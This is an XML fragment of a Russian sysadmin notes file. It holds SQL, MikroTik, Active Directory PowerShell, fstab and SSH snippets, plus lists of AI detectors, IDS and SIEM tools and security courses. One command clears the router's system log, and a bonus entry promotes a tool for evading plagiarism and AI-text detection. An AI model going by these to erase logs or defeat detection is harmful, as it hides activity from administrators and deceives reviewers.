      <text:p text:style-name="P26">WHERE column1 IS NULL OR column2 IS NULL;</text:p>
      <text:p text:style-name="P26">Заменяем NULL-значения на дефолтное выражение:</text:p>
      <text:p text:style-name="P26">UPDATE your_table</text:p>
      <text:p text:style-name="P26">SET column1 = 'default_value'</text:p>
      <text:p text:style-name="P26">WHERE column1 IS NULL;</text:p>
      <text:p text:style-name="P27">Переводим текст в верхний регистр:</text:p>
      <text:p text:style-name="P27">UPDATE your_table</text:p>
      <text:p text:style-name="P26">SET column1 = UPPER(column1);</text:p>
      <text:p text:style-name="P26">Обрезаем лишнее:</text:p>
      <text:p text:style-name="P26">UPDATE your_table</text:p>
      <text:p text:style-name="P26">SET column1 = TRIM(column1);</text:p>
      <text:p text:style-name="P26">Конвертируем строки в формат дат:</text:p>
      <text:p text:style-name="P26">UPDATE your_table</text:p>
      <text:p text:style-name="P26">SET date_column = TO_DATE(date_string, 'YYYY-MM-DD');</text:p>
      <text:p text:style-name="P26">Извлекаем год/месяц/день:</text:p>
      <text:p text:style-name="P26">SELECT EXTRACT(YEAR FROM date_column) AS year,</text:p>
      <text:p text:style-name="P26"><text:s text:c="7"/>EXTRACT(MONTH FROM date_column) AS month,</text:p>
      <text:p text:style-name="P26"><text:s text:c="7"/>EXTRACT(DAY FROM date_column) AS day</text:p>
      <text:p text:style-name="P26">FROM your_table;</text:p>
      <text:p text:style-name="P28">#db</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6">Настройка синхронизации времени по NTP и MikroTik Cloud Time (Москва):</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">/system ntp client set enabled=yes server-dns-names=time.google.com,0.pool.ntp.org,1.pool.ntp.org,2.pool.ntp.org,3.pool.ntp.org</text:span></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6">Очистка системного лога (оставляет сообщение о смене настроек лога):</text:p>
      <text:p text:style-name="P26">/system logging action set memory memory-lines=1</text:p>
      <text:p text:style-name="P28">/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7">add address=access.example.con list=DomainIPsAccess</text:p>
      <text:p text:style-name="P27">/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text:p>
      <text:p text:style-name="P26">/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text:p>
      <text:p text:style-name="P26">/interface wireless access-list</text:p>
      <text:p text:style-name="P26">add interface=all mac-address=8A:EA:B7:2E:38:C1 vlan-id=99 vlan-mode=use-tag</text:p>
      <text:p text:style-name="P26">Настройка пароля и безопасности WiFi на default профиль:</text:p>
      <text:p text:style-name="P26">/interface wireless security-profiles set default mode=dynamic</text:p>
      <text:p text:style-name="P26">-keys authentication-types=wpa2-psk unicast-ciphers=aes-ccm group-ciphers=aes-ccm</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">wpa2-pre-shared-key=bigpassword</text:span></text:p>
      <text:p text:style-name="P28">Включение пробросов портов SSH: /ip ssh set forwarding-enabled=both</text:p>
      <text:p text:style-name="P26">Как быстро удалять пустые строки в Excel? Пустые строки и столбцы в таблицах Excel могут быть настоящей головной болью. Они могут запутать стандартные функции сортировки, фильтрации, подведения итогов и создания сводных таблиц, что делает работу с данными менее эффективной. Чтобы быстро удалить все пустые строки в одной таблице:</text:p>
      <text:p text:style-name="P26">1. Выделите диапазон таблицы.</text:p>
      <text:p text:style-name="P26">2. Нажмите клавишу «F5» и тапните «Выделить».</text:p>
      <text:p text:style-name="P26">3. В открывшемся окошке выберите опцию «Пустые ячейки» → «ОК».</text:p>
      <text:p text:style-name="P26">4. Выделение со всей таблицы переместится только на пустые строки таблицы.</text:p>
      <text:p text:style-name="P28">5. Нажмите клавиши «Ctrl+”-”» (знак минуса), отметьте, что хотите удалить «строки» и щелкните «ОК».</text:p>
      <text:p text:style-name="P26">ИИ + Excel/Google Docs. Часть 1. Ускоряем, облегчаем и делаем работу с Excel более приятной:</text:p>
      <text:p text:style-name="P26">1. GPTExcel - нейронка, генерирующая формулы Excel, SQL запросы и не только. </text:p>
      <text:p text:style-name="P26">2. Genius Sheets (https://www.geniussheets.com/) - делает финансовые отчеты и различные таблицы в Excel/Docs;</text:p>
      <text:p text:style-name="P26">3. Formulas HQ (https://formulashq.com/) - переводит текст в таблицы Google Docs и Excel, помогает с формулами и т.д;</text:p>
      <text:p text:style-name="P27">4. formula bot (https://formulabot.com/) - переводит ваши текстовые инструкции в Excel формулы!;</text:p>
      <text:p text:style-name="P27">5. Sheet AI (https://www.sheetai.app/) - переводит ваши текстовые инструкции в формулы Google таблиц;</text:p>
      <text:p text:style-name="P28">6. AI Excel Bot (https://aiexcelbot.com/) - новый продукт, помогает с формулами. строит таблицы и т. д.</text:p>
      <text:p text:style-name="P26">Скрипт проверки активности всех ppp-соединений Mikrotik:</text:p>
      <text:p text:style-name="P26"># если по тоннелю пинга нет, то осуществляется разрыв тоннеля для переподключения</text:p>
      <text:p text:style-name="P26"># внимание ! скрипт будет отключать активное vpn-соединение с админом, т.к. до него пинга не будет !</text:p>
      <text:p text:style-name="P26"># поэтому в скрипте сделан обход удаления данного соединения (задаётся в adminClient, должен соответствовать ppp secret)</text:p>
      <text:p text:style-name="P26">:local adminClient "you ppp secret admins` name"</text:p>
      <text:p text:style-name="P26">:local pppTest value=[/ppp active find];</text:p>
      <text:p text:style-name="P26">:local pingNumber value=2;</text:p>
      <text:p text:style-name="P26">:local pingMin value=1;</text:p>
      <text:p text:style-name="P26">:foreach userTest in=$pppTest do={</text:p>
      <text:p text:style-name="P26"><text:s/>:local pingOk value=[:ping [/ppp active get $userTest value-name=address] count=$pingNumber]</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5"><text:s/>:if (($pingOk &lt; $pingMin) &amp;&amp; ([/ppp active get $userTest value-name=name]!=$adminClient)) do={</text:span></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>:log warning message=([/ppp active get $userTest value-name=service] . " auto disconnected: ". $pingOk . " ping ok over " . $pingNumber . " " . [/ppp active get $userTest value-name=name] . " " . [/ppp active get $userTest value-name=address])</text:p>
      <text:p text:style-name="P26">/ppp active remove $userTest</text:p>
      <text:p text:style-name="P26"><text:s/>}</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26">если нужно проверять только определенный вид ppp замените строку :</text:p>
      <text:p text:style-name="P26"># :local pppTest value=[/ppp active find];</text:p>
      <text:p text:style-name="P26">на строку, например</text:p>
      <text:p text:style-name="P26"># :local pppTest value=[/ppp active find where service=pptp];</text:p>
      <text:p text:style-name="P28">Для использования поставьте этот скрипт в Планировщик с нужным интервалом (оптимально не менее 30 сек)</text:p>
      <text:p text:style-name="P26">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text:p>
      <text:p text:style-name="P26">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text:p>
      <text:p text:style-name="P26">CheckSDRefDom - Проверяет правильность доменов ссылок дескрипторов безопасности для каждого раздела каталогов программ</text:p>
      <text:p text:style-name="P26">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text:p>
      <text:p text:style-name="P27">CrossRefValidation - Проверяет правильность перекрестных ссылок для доменов</text:p>
      <text:p text:style-name="P27">RRSSysvol - проверяет состояние готовности для FRS SYSVOL</text:p>
      <text:p text:style-name="P26">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text:p>
      <text:p text:style-name="P26">FSMOCheck - Не проверяет роли хозяев операций, а вместо этого запрашивает сервер глобального каталога, первичный контроллер домена, предпочтительный сервер времени, сервер времени и центр распространения ключей</text:p>
      <text:p text:style-name="P26">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text:p>
      <text:p text:style-name="P26">KCCEvent - Проверяет безошибочность создания объектов соединений для репликации между сайтами</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">KnowsOfRoleHolders - Проверяет возможность подключения контроллеров домена ко всем пяти хозяевам операций</text:span></text:p>
      <text:p text:style-name="P26">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text:p>
      <text:p text:style-name="P26">NCSecDesc - Проверяет правильность разрешений для репликации в дескрипторах безопасности для заголовков контекста именования</text:p>
      <text:p text:style-name="P26">NetLogons - Проверяет правильность разрешений регистрации, позволяющих регистрацию, для каждого контроллера домена</text:p>
      <text:p text:style-name="P26">ObjectsReplicated - Проверяет правильность репликации агента сервера каталогов и объектов учетных записей компьютеров</text:p>
      <text:p text:style-name="P26">OutboundSecureChannels - Проверяется наличие безопасных каналов между всеми контроллерами домена в интересующем домене</text:p>
      <text:p text:style-name="P26">Replications - Проверяет возможность репликации между контроллерами домена и сообщает обо всех ошибках при репликации</text:p>
      <text:p text:style-name="P26">RidManager - Проверяет работоспособность и доступность хозяина относительных идентификаторов</text:p>
      <text:p text:style-name="P26">Services - Проверяет работоспособность всех служб, необходимых для работы контроллера домена, на указанном контроллере домена</text:p>
      <text:p text:style-name="P26">SystemLog - Проверяет безошибочность работы системного журнала</text:p>
      <text:p text:style-name="P26">VerifyEnterpriseReferences - Проверяет действительность системных ссылок службы репликации файлов для всех объектов на всех контроллерах домена в лесу</text:p>
      <text:p text:style-name="P26">VerifyReferences - Проверяет действительность системных ссылок службы репликации файлов для всех объектов на указанном контроллере домена</text:p>
      <text:p text:style-name="P26">VerifyReplicas - Проверяет действительность всех разделов каталога приложения на всех серверах, принимающих участие в репликации</text:p>
      <text:p text:style-name="P28">Синтаксис команды dcdiag: dcdiag /s:&lt;DomainController&gt; [/n:&lt;NamingContext&gt;] [[/u:&lt;domain\user&gt;] [/p:&lt;password&gt;] ] [{/a|/e}{/q|/v}] [/i] [/f:&lt;LogFile&gt;] [/ferr:&lt;ErrorLog&gt;] [/c [/skip:&lt;test]] [/test:&lt;test&gt;] [/fix]</text:p>
      <text:p text:style-name="P27">Меняем пароль пользователя Active Directory с помощью PowerShell. Чтобы изменить пароль пользователя Active Directory, используйте команду Set-ADAccountPassword из модуля Active Directory для Windows PowerShell.</text:p>
      <text:p text:style-name="P27">Перед использованием командлета Set-ADAccountPassword вы должны импортировать этот модуль в сеанс PowerShell: Import-Module ActiveDirectory</text:p>
      <text:p text:style-name="P26">Пароль в памяти компьютера желательно хранить в защищенной форме, поэтому вы можете попросить администратора указать пароль следующим образом: $newPass=Read-Host "Enter the new user password" -AsSecureString</text:p>
      <text:p text:style-name="P26">Лучше указать имя учетной записи AD в виде имени samAccountname. Например, чтобы изменить пароль для пользователя jkelly, запустите команду: Set-ADAccountPassword jkelly -NewPassword $newPass</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Вы можете установить новый пароль пользователя непосредственно внутри кода скрипта: Set-ADAccountPassword jkelly–NewPassword (ConvertTo-SecureString -AsPlainText –String "St0ngPwd@d" -force)</text:span></text:p>
      <text:p text:style-name="P26">Если вы хотите, чтобы пользователь изменил пароль при следующем входе в систему, выполните команду: Set-ADUser jkelly -ChangePasswordAtLogon $True</text:p>
      <text:p text:style-name="P28">Вы можете сбросить пароль для нескольких пользователей одновременно (предположим, что имена учетных записей хранятся в текстовом файле user_to_reset.txt). Используйте этот скрипт: Get-Content C:\PS\user_to_reset.txt | Set-ADAccountPassword -NewPassword $newPass -Reset</text:p>
      <text:p text:style-name="P26">Режим временного пользователя в группе AD. В Windows Server 2016 появился полезный функционал - режим временного добавления пользователя в группу с автоматическим удалением через указанное время. Т.е. администратор может включить другого пользователя в нужную группу на пару минут для решения срочной задачи и не заботиться про то чтобы эти права у пользователя позже отозвать. Фича работает только через Powershell. С чего начать? Проверяем режим работы леса, должен быть 2016 и выше: (Get-ADForest).ForestMode. Проверяем диапазон: Get-ADOptionalFeature -filter *| select EnableScopes. И включаем функционал, внимаение - включение работает в одну сторону и его отмена невозможна: Enable-ADOptionalFeature 'Privileged Access Management Feature' -Scope ForestOrConfigurationSet -Target company.com. Теперь задаем временной интервал в минутах (можно использовать и часы -Hours) и добавляем пользователя alex в группу "Администраторы домена":</text:p>
      <text:p text:style-name="P26">$ttl = New-TimeSpan -Minutes 2</text:p>
      <text:p text:style-name="P26">Add-ADGroupMember -Identity "Администраторы домена" -Members alex -MemberTimeToLive $ttl</text:p>
      <text:p text:style-name="P28">В любой момент можем проверить сколько осталось времени до удаления пользователя из группы, смотрим на значение TTL: Get-ADGroup “Администраторы домена” -Property member –ShowMemberTimeToLive. По истечении двух минут пользователь alex будет удален из группы “Администраторы домена” автоматически. Надеюсь он успеет решить проблему за это время.</text:p>
      <text:p text:style-name="P26">Подборка бесплатных курсов для ИБ-спеца. В этом посте собрали список курсов на тематику кибербеза, которые помогут вам на пути становления белым хакером и подскажут какие перспективы вас ждут в этой области: 1. Курс по Python для OSINT специалистов: (https://github.com/cipher387/python-for-OSINT-21-days) Он бесплатный и позволит тебе автоматизировать различные рутинные задачи, связанные с исследованиями: сбор данных с веб-сайтов, сбор результатов поиска, работа с интернет-архивами, создание отчетов и визуализация данных.</text:p>
      <text:p text:style-name="P30">2. Защищенные сетевые протоколы: (https://www.youtube.com/playlist?list=PLtPJ9lKvJ4oiFnWCsVRElorOLt69YDEnv) Курс продолжает серию уроков по сетям Андрея Созыкина. В нем рассматриваются такие темы, как TLS/SSL, HTTPS. Курс полностью покрывает все аспекты защищенных сетевых протоколов. 3. Курс хакинга – Hacking: (https://www.youtube.com/playlist?list=PLrXcA7Ca3B81tWWOaGF_RjDq-9F1e5Ine) Очень полезный и простой курс для начинающих по этичному хакингу (134 урока). 4. Этичный хакинг (https://www.youtube.com/playlist?list=PLPNYkZcYUF4srO1_ZkNEnHT8Q1AI8WFaV): Во время прохождения курса вы познакомитесь с практическими приемами пентеста, взломы веб-серверов и систем, познакомитесь с LogParser и OWASP, также узнаете как проводить SQL-инъекции и даже взломаете почтовый сервер. 5. Компьютерные сети. Продвинутые темы: (https://www.youtube.com/playlist?list=PLtPJ9lKvJ4oh_w4_jtRnKE11aqeRldCFI) Курс продолжает серию уроков по сетям Андрея Созыкина. В нем рассматриваются более сложные для понимания темы сетей, поэтому сначала необходимо посмотреть первые 2 части. <text:s/>По мере прохождения данной серии продвинутых лекций вы узнаете о таких темах, как: IPv6, NDP, RIP, OSPF, протоколы маршрутизации, BGP, Web-сокеты.</text:p>
      <text:p text:style-name="P26">Основы компьютерных сетей:</text:p>
      <text:p text:style-name="P26">Тема №1. Основные сетевые термины и сетевые модели (https://habr.com/ru/post/307252/)</text:p>
      <text:p text:style-name="P26">Тема №2. Протоколы верхнего уровня (https://habr.com/ru/post/307714/)</text:p>
      <text:p text:style-name="P26">Тема №3. Протоколы нижних уровней (транспортного, сетевого и канального) (https://habr.com/ru/post/308636/)</text:p>
      <text:p text:style-name="P26">Тема №4. Сетевые устройства и виды применяемых кабелей (https://habr.com/ru/post/312340/)</text:p>
      <text:p text:style-name="P26">Тема №5. Понятие IP адресации, масок подсетей и их расчет (https://habr.com/ru/post/314484/)</text:p>
      <text:p text:style-name="P26">Тема №6. Понятие VLAN, Trunk и протоколы VTP и DTP (https://habr.com/ru/post/319080/)</text:p>
      <text:p text:style-name="P26">Тема №7. Протокол связующего дерева: STP (https://habr.com/ru/post/321132/)</text:p>
      <text:p text:style-name="P26">Тема №8. Протокол агрегирования каналов: Etherchannel (https://habr.com/ru/post/334778/)</text:p>
      <text:p text:style-name="P28">Тема №9. Маршрутизация: статическая и динамическая на примере RIP, OSPF и EIGRP (https://habr.com/ru/post/335090/)</text:p>
      <text:p text:style-name="P26">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text:soft-page-break/><text:span text:style-name="T5">/dev/sda5: UUID="1efdbdda-df38-4f60-bb2c-81996eff323c" TYPE="swap" </text:span></text:p>
      <text:p text:style-name="P26">/dev/sda6: UUID="1eab3a42-b6c3-44e5-9e18-2ff284ecfba3" TYPE="ext4" </text:p>
      <text:p text:style-name="P26">/dev/sda7: LABEL="Data" UUID="5F573D4D2CFD981F" TYPE="ntfs"</text:p>
      <text:p text:style-name="P27">Для того чтобы подключить диск Data, который является 7-м разделом с файловой системой NTFS, редактируем /etc/fstab: sudo gedit /etc/fstab &amp;. Раздел NTFS добавляем в fstab запись с соответствующим UUID:</text:p>
      <text:p text:style-name="P27">UUID=5F573D4D2CFD981F /media/5F573D4D2CFD981F ntfs-3g rw,users,locale=ru_RU.UTF-8 0 0. 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8">Тогда добавляемая в fstab запись будет выглядеть так: UUID=5F573D4D2CFD981F /media/WinData ntfs-3g rw,users,locale=ru_RU.UTF-8 0 0. Раздел FAT и FAT32 монтируем в каталог /media/Patition-FAT32, добавляя запись: UUID=номер_UUID /media/Patition-FAT32 vfat shortname=mixed,codepage=850,umask=002,uid=1000,gid=100,noauto,user 0 0. Раздел Ext4 монтируем в каталог /media/Ubuntu20: UUID=номер_UUID /media/Ubuntu20 ext4 rw,users 0 0. <text:s/>Теперь после перезагрузки указанные в fstab диски будут автоматически примонтированы и доступны для приложений.</text:p>
      <text:p text:style-name="P26">Скрипты для диагностики DNS:</text:p>
      <text:p text:style-name="P26">https://github.com/m0zgen/dns-tester - Тестирование скорости ответа DNS со статистикой превышения, минимума, максимума;</text:p>
      <text:p text:style-name="P26">https://github.com/m0zgen/bench-dns - Простой скрипт для тестирования загрузки DNS. Написан на языке Go;</text:p>
      <text:p text:style-name="P26">https://github.com/m0zgen/check-dns-servers - Проверка DNS - Дата сертификата, DNS resolve, HTTP 200;</text:p>
      <text:p text:style-name="P26">https://github.com/m0zgen/mac-dns - Очистка кэша DNS и настройка DNS IP сервисов - Google, Cloudflare, BLD;</text:p>
      <text:p text:style-name="P28">https://github.com/m0zgen/bld-lookup - Соберите все IP-адреса DNS BLD и попытайтесь разрешить целевой домен с каждым IP BLD.</text:p>
      <text:p text:style-name="P28">ElevenLabs выкатили бесплатную нейросеть для генерации любых звуков по текстовому описанию. Можно создавать в том числе музыку, речь, пение птиц, звуки хруста костей, свиста, ядерного взрыва - elevenlabs.io/app/sound-effects</text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T5">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text:span><text:soft-page-break/><text:span text:style-name="T5">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text:span></text:p>
      <text:p text:style-name="P27">Теперь подключим сам репозиторий: echo "deb [signed-by=/usr/share/keyrings/wsdd.gpg] https://pkg.ltec.ch/public/ `lsb_release -cs` main" &gt; /etc/apt/sources.list.d/wsdd.list. Обновим список пакетов и установим нужную нам службу:</text:p>
      <text:p text:style-name="P26">apt update</text:p>
      <text:p text:style-name="P26">apt install wsdd</text:p>
      <text:p text:style-name="P26">Пакет будет автоматически добавлен в автозагрузку и нам останется только запустить его и проверить статус:</text:p>
      <text:p text:style-name="P26">systemctl start wsdd</text:p>
      <text:p text:style-name="P26">systemctl status wsdd</text:p>
      <text:p text:style-name="P26">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text:p>
      <text:p text:style-name="P28">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Cо стороны Windows делать ничего не нужно, Samba-сервера автоматически появятся в вашем сетевом окружении.</text:p>
      <text:p text:style-name="P26">Определяем контент, созданный нейросетями. Full Pack:</text:p>
      <text:p text:style-name="P26">1. Buster AI <text:s/>(https://aiinfinity.blogspot.com/p/ai-detection-busterai.html) - проверяет написан ли текст нейросетями:</text:p>
      <text:p text:style-name="P26">2. Detect GPT (https://chromewebstore.google.com/detail/detectgpt-detect-chat-gpt/oadkgbgppkhoaaoepjbcnjejmkknaobg) - браузерное расширение с говорящим названием;</text:p>
      <text:p text:style-name="P26">3. GLTR AI Detection (http://gltr.io/) - еще один мощный инструмент определения текста;</text:p>
      <text:p text:style-name="P26">4. GPTZero <text:s/>(https://gptzero.me/) - не раз упомянутый мной инструмент для работы с текстом;</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">5. AI Text Classifier (https://platform.openai.com/ai-text-classifier) - определяет текст, написанный моделями ChatGPT;</text:span></text:p>
      <text:p text:style-name="P26">6. Originality (https://originality.ai/) - серьезный детектор плагиата и использования нейросетей;</text:p>
      <text:p text:style-name="P26">7. Illuminarty (https://illuminarty.ai/en/) - определяет картинку или текст посредством сравнительного анализа;</text:p>
      <text:p text:style-name="P26">8. AI or Not (https://www.aiornot.com/) - определит картинку, видео или запись голоса;</text:p>
      <text:p text:style-name="P26">9. Writer <text:s/>(https://writer.com/ai-content-detector/) - еще один неплохой детектор текста. написанного нейросетями:</text:p>
      <text:p text:style-name="P26">10. ZeroGPT <text:s/>(https://www.zerogpt.com/) - определяет текст, написанный моделями OpenAI;</text:p>
      <text:p text:style-name="P27">11. V7 Deepfake Detector <text:s/>(https://www.v7labs.com/news/v7-releases-deep-fake-detector-for-chrome) - определяет дипфейки, можно запросить демо версию;</text:p>
      <text:p text:style-name="P27">12. GPTZero Online <text:s/>(https://etedward-gptzero-main-zqgfwb.streamlit.app/) - лайт версия GPTZero;</text:p>
      <text:p text:style-name="P26">13. QuillBot (https://quillbot.com/ai-content-detector) - новый инструмент определения текста;</text:p>
      <text:p text:style-name="P26">14. Scibbr <text:s/>(https://www.scribbr.com/ai-detector/) - еще один минималистичный он-лайн детектор;</text:p>
      <text:p text:style-name="P28">Бонус: BypassGPT (https://bypassgpt.ai/) - рерайт/антидетект ИИ на стеройдах. Поможет обойти большинство программ антиплагиата и детекта.</text:p>
      <text:p text:style-name="P26">Примеры скриптов для Mikrotik. Проверка изменения IP-адреса интерфейса для Mikrotik. Иногда провайдер выдает динамические IP-адреса. Этот скрипт проверит, не изменился ли динамический IP-адрес.</text:p>
      <text:p text:style-name="P26">:global currentIP;</text:p>
      <text:p text:style-name="P26">:local newIP [/ip address get [find interface="ether1"] address];</text:p>
      <text:p text:style-name="P26">:if ($newIP != $currentIP) do={</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>:put "ip address $currentIP changed to $newIP";</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>:set currentIP $newIP;</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26">Netmask. Этот скрипт полезен, если вам нужен ip-адрес без netmask (например, чтобы использовать его в брандмауэре), а "/ip address get [id] address" возвращает ip-адрес и netmask.</text:p>
      <text:p text:style-name="P26">:global ipaddress 10.1.101.1/24</text:p>
      <text:p text:style-name="P26">:for i from=( [:len $ipaddress] - 1) to=0 do={ </text:p>
      <text:p text:style-name="P26"><text:s/>:if ( [:pick $ipaddress $i] = "/") do={ </text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>:put [:pick $ipaddress 0 $i]</text:p>
      <text:p text:style-name="P26"><text:s/>} </text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26">Резолвим имя хоста. Многие пользователи спрашивают, как использовать dns-имена вместо IP-адресов для серверов radius, правил брандмауэра и т.д. Вот пример того, как резовлить IP-адрес сервера RADIUS. Допустим, у нас настроен сервер radius:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">/radius </text:span></text:p>
      <text:p text:style-name="P26">add address=3.4.5.6 comment=myRad</text:p>
      <text:p text:style-name="P26">А вот скрипт, который резовлит ip-адрес, сравнит ip с настроенным и заменит, если они не равны:</text:p>
      <text:p text:style-name="P26">/system script add name="resolver" source= {</text:p>
      <text:p text:style-name="P26">:local resolvedIP [:resolve "server.example.com"];</text:p>
      <text:p text:style-name="P26">:local radiusID [/radius find comment="myRad"];</text:p>
      <text:p text:style-name="P26">:local currentIP [/radius get $radiusID address];</text:p>
      <text:p text:style-name="P26">:if ($resolvedIP != $currentIP) do={</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>/radius set $radiusID address=$resolvedIP;</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>/log info "radius ip updated";</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26">Добавьте этот скрипт в планировщик, чтобы он выполнялся, например, каждые 5 минут:</text:p>
      <text:p text:style-name="P25">/system scheduler add name=resolveRadiusIP on-event="resolver" interval=5m</text:p>
      <text:p text:style-name="P27">Подборка идентификаторов сетевых вторжений. IDS/IPS - системы обнаружения и предотвращения вторжений, которые обеспечивают детальный мониторинг сетевой активности, выявление аномалий и реагирование на потенциальные угрозы в реальном времени:</text:p>
      <text:p text:style-name="P26">1. Stealth (https://fbb-git.gitlab.io/stealth/): (https://fbb-git.gitlab.io/stealth/) проверка целостности файлов, которая практически не оставляет следов. Контроллер запускается с другого компьютера, что затрудняет злоумышленнику получение информации о том, что файловая система проверяется через определенные псевдослучайные интервалы времени по SSH</text:p>
      <text:p text:style-name="P26">2. AIEngine (https://aiengine.readthedocs.io/en/latest/aiengine.html): (https://aiengine.readthedocs.io/en/latest/aiengine.html) это интерактивный, программируемый движок проверки пакетов с функциями NIDS (Network Intrusion Detection System), классификацией доменов DNS, сборщиком сетевых данных, сетевой экспертизой и многими другими</text:p>
      <text:p text:style-name="P26">3. Fail2Ban (http://www.fail2ban.org/wiki/index.php/Main_Page): (http://www.fail2ban.org/wiki/index.php/Main_Page) инструмент для сканирования файлов журналов и выполнения ряда действия с IP-адресами, которые демонстрируют вредоносное поведение</text:p>
      <text:p text:style-name="P26">4. Denyhosts (http://denyhosts.sourceforge.net/): (http://denyhosts.sourceforge.net/) инструмент для предотвращения атак на основе словаря SSH и атак методом перебора</text:p>
      <text:p text:style-name="P28">5. SSHGuard (http://www.sshguard.net/): (http://www.sshguard.net/) защищает хосты от атак грубой силы, отслеживает файлы системных журналов</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">SOC: инструменты для управления киберугрозами. Инструменты SOC помогают организациям отслеживать угрозы безопасности и быстро реагировать на них в режиме реального времени. SIEM (Security information and </text:span><text:soft-page-break/><text:span text:style-name="T5">event management) - это класс программных продуктов, предназначенных для сбора и анализа информации о событиях безопасности</text:span></text:p>
      <text:p text:style-name="P26">1. McAfee Enterprise Security Manager (ESM) (https://www.esecurityplanet.com/products/mcafee-enterprise-security-manager-esm/): (https://www.esecurityplanet.com/products/mcafee-enterprise-security-manager-esm/) это инструмент SIEM, используемый для обнаружения угроз в режиме реального времени, ведения журналов и составления отчетов о соответствии требованиям</text:p>
      <text:p text:style-name="P26">2. Palo Alto Networks (https://www.paloaltonetworks.com/): (https://www.paloaltonetworks.com/) это платформа безопасности, которая сочетает в себе сетевую, конечную и облачную безопасность для предотвращения кибератак</text:p>
      <text:p text:style-name="P27">3. Splunk Enterprise Security (https://splunkbase.splunk.com/app/263): (https://splunkbase.splunk.com/app/263) инструмент SIEM используется для мониторинга в режиме реального времени, обнаружения угроз и реагирования на инциденты. Генерирует оповещения для дополнительного расследования, используя расширенные возможности корреляции и аналитики, чтобы выявлять закономерности сомнительного поведения</text:p>
      <text:p text:style-name="P27">4. IBM QRadar (https://www.ibm.com/qradar?ysclid=m12c99koag789300988): (https://www.ibm.com/qradar?ysclid=m12c99koag789300988) инструмент SIEM, используемый для управления журналами, мониторинга сети и активности пользователей, а также анализа угроз. Автоматизирует процессы обнаружения угроз и реагирования с использованием методов машинного обучения и искусственного интеллекта</text:p>
      <text:p text:style-name="P28">5. Elastic Security (https://www.elastic.co/security): (https://www.elastic.co/security) Это платформа анализа безопасности и обнаружения угроз с открытым исходным кодом, использующая алгоритмы машинного обучения. Масштабируемость - одно из лучших качеств Elastic Security</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T5">Запуск команд на удаленном компьютере через SSH-подключение. Протокол SSH, помимо работы в интерактивном режиме, поддерживает также разовый запуск команд или скриптов на удаленном компьютере под управлением ОС семейства Linux. Синтаксис команды запуска удаленной команды: ssh [пользователь]@[сервер] '[команда]'. Если доступ по ssh реализован по ключевой паре, то команда выполнится немедленно. Если нет, то при запросе вводим пароль указанного пользователя и в консоли получаем вывод команды, если таковой имеется. Например, получим информацию об установленной на удаленном сервере операционной системе: ssh my_name@192.168.1.77 'uname -a'. Чтобы запустить несколько команд за одно подключение, можно использовать символ “;” в качестве разделителя. Проверим время работы удаленного компьютера, его загрузку и запросим все активные сетевые подключения на удаленном компьютере: ssh <text:s/>my_name@192.168.1.77 'uptime; netstat -anp tcp'. В случае, если потребуется запустить на удаленном сервере локальный файл скрипта, то потребуется в SSH-подключении вызвать </text:span><text:soft-page-break/><text:span text:style-name="T5">командный интерпретатор в режиме исполнения сценария (например, bash с ключом -s), и на стандартный ввод передать ему файл скрипта. Команда запуска локального скрипта на удаленном компьютере будет выглядеть примерно так: ssh <text:s/>my_name@192.168.1.77 'bash -s' &lt; /home/user/anycript.sh. В результате скрипт в локальном файл /home/user/anyscript.sh исполнится на удаленном сервере.</text:span></text:p>
      <text:p text:style-name="P26">Gamer Starter Pack. V1:</text:p>
      <text:p text:style-name="P26">2. itch.io - это открытая торговая площадка для авторов, специализирующаяся на инди-играх;</text:p>
      <text:p text:style-name="P26">3. Game Jolt <text:s/>(https://gamejolt.com/games) - вторая по популярности площадка для инди-игр;</text:p>
      <text:p text:style-name="P26">4. Acid Play <text:s/>(https://acid-play.com/hottest) - <text:s/>сборник игр для олдфагов, например, Icy Tower, Chicken Invaders, Bomberman и т.д.</text:p>
      <text:p text:style-name="P26">5. MegaGame <text:s/>(https://megagames.com/) - олдовый сайт с репаками игр и различными модами;</text:p>
      <text:p text:style-name="P26">6. NexusMods (https://www.nexusmods.com/) - топовая мастерская модов для большинства популярных игр;</text:p>
      <text:p text:style-name="P25">7. shadps4-emu (http://github.com/shadps4-emu) - эмулятор игр для PlayStation 4 на ПК. Через него можно запустить BloodBorne и не только.</text:p>
      <text:p text:style-name="P27">Скрипт для мониторинга дискового пространства в Linux. Скрипт ниже предназначен для мониторинга использования дискового пространства на указанном разделе сервера. Настраиваемые параметры включают в себя максимально допустимый процент использования дискового пространства (`MAX`), адрес электронной почты для получения оповещений (`EMAIL`) и целевой раздел (`PARTITION`). Скрипт использует команду df для сбора информации об использовании диска и отправляет предупреждения по электронной почте, если текущее использование превышает заданный порог:</text:p>
      <text:p text:style-name="P26">#!/bin/bash</text:p>
      <text:p text:style-name="P26"># Set the maximum allowed disk space usage percentage</text:p>
      <text:p text:style-name="P26">MAX=90</text:p>
      <text:p text:style-name="P26"># Set the email address to receive alerts</text:p>
      <text:p text:style-name="P26">EMAIL=user@example.com</text:p>
      <text:p text:style-name="P26"># Set the partition to monitor (change accordingly, e.g., /dev/sda1)</text:p>
      <text:p text:style-name="P26">PARTITION=/dev/sda1</text:p>
      <text:p text:style-name="P26"># Get the current disk usage percentage and related information</text:p>
